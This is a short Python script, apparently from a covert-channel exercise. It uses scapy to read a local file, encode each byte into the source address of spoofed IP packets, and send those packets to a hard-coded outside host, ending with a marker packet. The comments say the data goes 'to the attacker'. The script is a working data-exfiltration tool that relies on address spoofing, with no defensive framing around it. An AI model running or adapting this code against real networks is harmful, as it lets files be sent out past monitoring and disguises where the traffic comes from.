##This gets the message and decodes it to binary
##then it sends that bianry meessage to the attacker

from scapy.all import *


spoffed_ip = "138.47.50.50"
EOF = "69.69.69.69"
port = 10010


covertBin = []
with open("Test.txt", "rb") as f:
    covert = f.read()
for line in covert:
    covertBin.append(bin(line)[2:].zfill(8))



def decodeIP(IP):
    ipSplit = IP.split(".")
    decimal = ipSplit[3]
    binary = bin(int(decimal))
    binary = str(binary[2:].zfill(8))

    return binary


# IP is a string representation of a normal IP address
# binary is a string representation of an byte of binary data that you want to hide
# encodedIP is a string representation of an encoded IP address

def encodeIP(IP, binary, seq):
    dot1Index = IP.find(".")
    dot2Index = IP.find(".",dot1Index+1)

    decimal = str(int(binary,2))

    encodedIP = IP[:dot2Index+1] + str(seq) + "." + decimal
    return encodedIP



for j in range (len(covertBin)):
    srcip= encodeIP(spoffed_ip, covertBin[j], j)
    packet=(IP(dst="138.47.141.116", src= srcip )/TCP(sport = port))
    sentpacket = sr1(packet, retry = 0, timeout = 1)
    print(j)




pac=(IP(dst="138.47.141.116", src= EOF)/TCP(sport = port))
senpac = sr1(pac, retry = 0, timeout = 1)





    
